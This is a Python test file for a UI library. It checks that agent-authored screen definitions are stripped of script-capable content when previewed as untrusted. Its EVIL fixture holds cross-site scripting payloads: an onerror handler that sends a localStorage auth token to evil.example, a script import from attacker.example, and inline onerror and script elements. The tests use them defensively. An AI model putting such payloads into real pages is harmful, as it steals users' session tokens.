"""NB1: a screen an AGENT authored is untrusted — the shells render it through ``__preview__`` with
``_untrusted: true`` and nothing in what comes back can run script in the user's tab. The rules are
the shared cases of ``conformance/untrusted/cases.json`` (also Java, .NET, libs/mateu, Redwood)."""

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from mateu_ui.core import MateuRegistry, RunActionRq, SyncHandler  # noqa: E402
from mateu_ui.core.untrusted import neutralize  # noqa: E402


def _cases():
    for parent in Path(__file__).resolve().parents:
        candidate = parent / "conformance" / "untrusted" / "cases.json"
        if candidate.exists():
            return json.loads(candidate.read_text(encoding="utf-8"))["cases"]
    raise AssertionError("conformance/untrusted/cases.json not found")


def test_the_shared_cases_hold():
    cases = _cases()
    assert len(cases) > 5
    for c in cases:
        assert neutralize(c["input"]) == c["expected"], c["name"]


EVIL = """
type: VerticalLayout
content:
  - type: Text
    text: "Generated by the agent"
  - type: Element
    name: img
    attributes:
      src: x.png
      onerror: "fetch('https://evil.example/'+localStorage.__mateu_auth_token)"
      import: https://attacker.example/x.js
  - type: Element
    name: div
    html: true
    content: "<img src=x onerror=alert(1)>"
  - type: Element
    name: script
    content: alert(1)
"""


def _preview(untrusted: bool) -> str:
    parameters = {"_yaml": EVIL}
    if untrusted:
        parameters["_untrusted"] = True
    inc = SyncHandler(MateuRegistry(sys.modules[__name__])).handle(
        RunActionRq(route="", consumed_route="_empty", action_id="__preview__", parameters=parameters)
    )
    return json.dumps(inc.model_dump(by_alias=True, mode="json"))


def test_an_untrusted_preview_keeps_nothing_script_capable_and_renders_the_rest():
    wire = _preview(True)
    assert "Generated by the agent" in wire and "x.png" in wire
    assert '"onerror"' not in wire
    assert "attacker.example" not in wire
    assert '"script"' not in wire
    assert '"html": true' not in wire


def test_the_authors_own_preview_renders_as_written():
    wire = _preview(False)
    assert '"onerror"' in wire and '"html": true' in wire


BENIGN = """
type: VerticalLayout
content:
  - type: Text
    text: "Hi"
  - type: FormField
    id: email
    dataType: string
    label: "Email"
    required: true
  - type: Button
    label: "Save"
    actionId: "save"
  - type: Card
    title: "A card"
    content:
      - type: Badge
        text: "ok"
  - type: Grid
    id: g
    columns:
      - type: GridColumn
        id: name
        label: Name
"""


def test_a_definition_with_nothing_to_take_out_comes_back_identical():
    import re

    def wire(untrusted):
        parameters = {"_yaml": BENIGN, **({"_untrusted": True} if untrusted else {})}
        inc = SyncHandler(MateuRegistry(sys.modules[__name__])).handle(
            RunActionRq(route="", consumed_route="_empty", action_id="__preview__", parameters=parameters)
        )
        return re.sub(r'"id": "[0-9a-f-]{36}"', '"id": "x"', json.dumps(inc.model_dump(by_alias=True, mode="json")))

    assert wire(True) == wire(False)
